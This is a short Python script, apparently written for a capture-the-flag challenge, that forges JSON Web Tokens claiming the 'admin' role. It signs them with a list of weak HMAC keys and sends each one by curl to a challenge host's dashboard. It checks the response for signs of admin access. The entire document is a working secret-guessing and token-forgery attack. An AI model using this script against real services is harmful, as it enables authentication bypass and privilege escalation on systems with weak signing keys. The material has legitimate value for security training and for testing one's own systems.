import hmac
import hashlib
import base64
import subprocess

header = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'
payload = 'eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwicXhwIjoxNzc0NzA2NzEyfQ'

weak_keys = ['', 'secret', '123456', 'password', 'admin', 'jwt', 'key', 'star', 'staralliance', 'xm', '12345678']

for key in weak_keys:
    message = header + '.' + payload
    signature = hmac.new(key.encode(), message.encode(), hashlib.sha256).digest()
    signature_b64 = base64.urlsafe_b64encode(signature).decode().rstrip('=')
    jwt = message + '.' + signature_b64

    print(f'Testing key: {key!r}')
    result = subprocess.run(['curl.exe', '-X', 'GET', 'http://80-3829ff0b-6e88-4697-9c89-87d2b7b04632.challenge.ctfplus.cn/dashboard.php',
                            '-H', f'Cookie: token={jwt}', '-s'], capture_output=True, text=True)
    if 'admin' in result.stdout:
        print('✅ SUCCESS! Found admin access!')
        print(result.stdout[:500])
        break
    elif '当前身份：admin' in result.stdout:
        print('✅ SUCCESS! Admin role confirmed!')
        print(result.stdout[:500])
        break
